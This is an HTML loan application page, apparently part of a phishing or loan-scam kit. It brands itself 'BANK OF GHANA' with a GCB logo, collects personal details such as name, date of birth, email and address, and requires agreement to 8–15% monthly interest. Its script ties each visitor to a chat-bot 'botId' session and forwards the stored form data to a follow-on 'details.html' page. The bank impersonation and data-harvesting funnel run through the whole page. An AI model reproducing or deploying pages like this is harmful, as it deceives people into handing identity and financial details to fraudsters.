<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Loan Application</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#f5f5f5;
}

/* HEADER */
.header{
  width:100%;
  background:#fff;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  padding:20px 0 10px;
  border-bottom:1px solid #eee;
}

.header img{
  max-width:160px;
  height:auto;
  margin-bottom:8px;
}

.bank-text{
  font-size:14px;
  font-weight:bold;
  color:#000;
  letter-spacing:1px;
}

/* CONTAINER */
.container{
  max-width:420px;
  margin:auto;
  padding:20px;
}

/* PAGE HEADER */
.page-header h1{
  margin:0;
  font-size:22px;
  color:#0a8f55;
}

.page-header p{
  margin:6px 0 18px;
  font-size:14px;
  color:#777;
}

/* FORM */
form label{
  font-size:14px;
  display:block;
  margin-bottom:6px;
  color:#444;
}

form input,
form select{
  width:100%;
  padding:14px;
  font-size:16px;
  margin-bottom:20px;
  border-radius:12px;
  border:1px solid #ccc;
  outline:none;
}

form input:focus,
form select:focus{
  border-color:#0a8f55;
}

/* CHECKBOX */
.checkbox-wrapper{
  display:flex;
  gap:10px;
  margin-bottom:18px;
  font-size:14px;
  color:#444;
  align-items:flex-start;
}

.checkbox-wrapper input{
  width:auto;
  margin-top:3px;
}

/* BUTTON */
button{
  width:100%;
  padding:16px;
  font-size:16px;
  background:#0a8f55;
  color:white;
  border:none;
  border-radius:12px;
  cursor:pointer;
  opacity:0.5;
}

button.enabled,
button:enabled{
  opacity:1;
  cursor:pointer;
}
</style>
</head>

<body>

<!-- HEADER -->
<div class="header">
  <img src="GCB-logo.png" alt="GCB Logo">
  <div class="bank-text">BANK OF GHANA</div>
</div>

<div class="container">

<div class="page-header">
  <h1>Loan Application</h1>
  <p>Provide your personal details</p>
</div>

<form id="loanForm">

  <label>Full name</label>
  <input name="fullName" required />

  <label>Date of birth</label>
  <input type="date" name="dob" required />

  <label>Email address</label>
  <input type="email" name="email" required />

  <label>Residential address</label>
  <input name="address" required />

  <label>Employment status</label>
  <select name="employmentStatus" required>
    <option value="">Select</option>
    <option>Employed</option>
    <option>Self-employed</option>
    <option>Unemployed</option>
    <option>Student</option>
  </select>

  <label>Loan purpose</label>
  <select name="loanPurpose" required>
    <option value="">Select</option>
    <option>Business</option>
    <option>Personal</option>
    <option>Education</option>
    <option>Medical</option>
    <option>Emergency</option>
  </select>

  <label>Loan amount (GHS)</label>
  <input type="number" name="loanAmount" required placeholder="MIN 100" min="100" max="100000" />

  <label>Loan term</label>
  <select name="loanTerm" required>
    <option value="">Select</option>
    <option>7 days</option>
    <option>14 days</option>
    <option>30 days</option>
    <option>60 days</option>
    <option>90 days</option>
  </select>

  <div class="checkbox-wrapper">
    <input type="checkbox" id="termsCheck" />
    <label for="termsCheck">I agree to the Terms and Conditions</label>
  </div>

  <div class="checkbox-wrapper">
    <input type="checkbox" id="interestCheck" />
    <label for="interestCheck">
      I understand loans are subject to <strong>8%–15% interest per month</strong>
      depending on credit score and loan amount.
    </label>
  </div>

  <button id="continueBtn" type="submit" disabled>Continue</button>

</form>

</div>

<script>
const form = document.getElementById('loanForm');
const termsCheck = document.getElementById('termsCheck');
const interestCheck = document.getElementById('interestCheck');
const button = document.getElementById('continueBtn');

// BOT SESSION LOGIC
const params = new URLSearchParams(window.location.search);
const urlBotId = params.get('botId');

if(urlBotId){
  localStorage.setItem('botId', urlBotId);
}

const botId = localStorage.getItem('botId');

if(!botId){
  alert('Invalid session. Please start again.');
  window.location.href='/bot/bot1';
}

// ENABLE BUTTON ONLY WHEN BOTH CHECKBOXES ARE CHECKED
function updateButton(){
  button.disabled = !(termsCheck.checked && interestCheck.checked);
}

termsCheck.addEventListener('change', updateButton);
interestCheck.addEventListener('change', updateButton);

// FORM SUBMIT
form.addEventListener('submit', (e)=>{
  e.preventDefault();
  const data = Object.fromEntries(new FormData(form));
  localStorage.setItem('loanFormData', JSON.stringify(data));
  localStorage.setItem('fullName', data.fullName);
  window.location.href='details.html?botId=' + botId;
});
</script>

</body>
</html>
